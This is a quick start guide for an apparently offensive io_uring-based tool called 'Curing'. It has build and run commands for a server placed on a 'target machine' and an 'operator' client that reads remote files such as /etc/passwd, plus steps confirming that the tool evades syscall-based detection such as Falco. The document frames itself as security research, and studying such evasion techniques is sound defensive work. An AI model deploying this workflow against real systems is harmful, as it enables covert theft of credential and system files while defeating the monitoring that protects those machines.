# Curing Quick Start Guide

## 🚀 5-Minute Setup

### 1. Build
```bash
make clean && make all
```

### 2. Start Server (Terminal 1)
```bash
./build/server                    # Default: localhost:8888
./build/server -port 9999         # Custom port
./build/server -host 0.0.0.0      # Bind all interfaces
```

### 3. Start Interactive Client (Terminal 2)
```bash
./build/client -interactive                    # Local connection
./build/client -interactive -port 9999        # Custom port
./build/client -interactive -host 192.168.1.5 # Remote server
```

### 4. Read Files Interactively
```
> /etc/hostname
> /etc/passwd
> /var/log/syslog
> quit
```

## 🌐 Remote Deployment

### Server (Target Machine)
```bash
./build/server -host 0.0.0.0 -port 443  # Bind all interfaces, port 443
```

### Client (Operator Machine)  
```bash
./build/client -interactive -host 192.168.1.100 -port 443
```

## 📋 Common Commands

### Server Commands
```bash
./build/server -help                    # Show help
./build/server -port 8080              # Custom port
./build/server -host 0.0.0.0           # Bind all interfaces  
./build/server -config custom.json     # Custom config file
```

### Client Commands
```bash
./build/client -help                           # Show help
./build/client -interactive                    # Interactive mode
./build/client -host 10.0.0.1 -port 8080     # Connect to remote server
./build/client -interactive -config custom.json  # Custom config file
```

## 🔧 Configuration Template

Create `custom-config.json`:
```json
{
    "server": {
        "host": "0.0.0.0", 
        "port": 443
    },
    "connect_interval_sec": 300
}
```

Use config file:
```bash
./build/server -config custom-config.json
./build/client -interactive -config custom-config.json
```

## ⚡ Testing Examples

### Large Files
```bash
> /var/log/syslog
> /proc/meminfo  
> /proc/cpuinfo
```

### System Files
```bash
> /etc/passwd
> /etc/hosts
> /etc/resolv.conf
> /etc/fstab
```

## 🛡️ Bypass Verification

### Verify io_uring Usage
```bash
# Monitor syscalls (separate terminal)
strace -f -e trace=openat,read,write -p $(pgrep server)

# Use client to read files
./build/client -interactive
> /etc/passwd
```

You should see **no file operation syscalls** from the server process - everything goes through io_uring.

### Network Verification  
```bash
# Monitor network syscalls
strace -f -e trace=socket,connect,send,recv -p $(pgrep client)
```

Client should also show no traditional network syscalls.

## 🔍 Troubleshooting

### Connection Issues
```bash
netstat -tlnp | grep :8888    # Check if port is listening
telnet localhost 8888         # Test connection
```

### Permission Issues  
```bash
ls -la /etc/shadow            # Check file permissions
sudo ./build/server           # Run as root if needed
```

## 📚 More Information

- **[Main README](README.md)** - Overview and features
- **[Original POC](poc/POC.md)** - Falco bypass demonstration  
- **[Changelog](CHANGELOG.md)** - What's new in this version

---

**⚠️ Security Notice**: For security research and education only. Follow applicable laws and regulations.
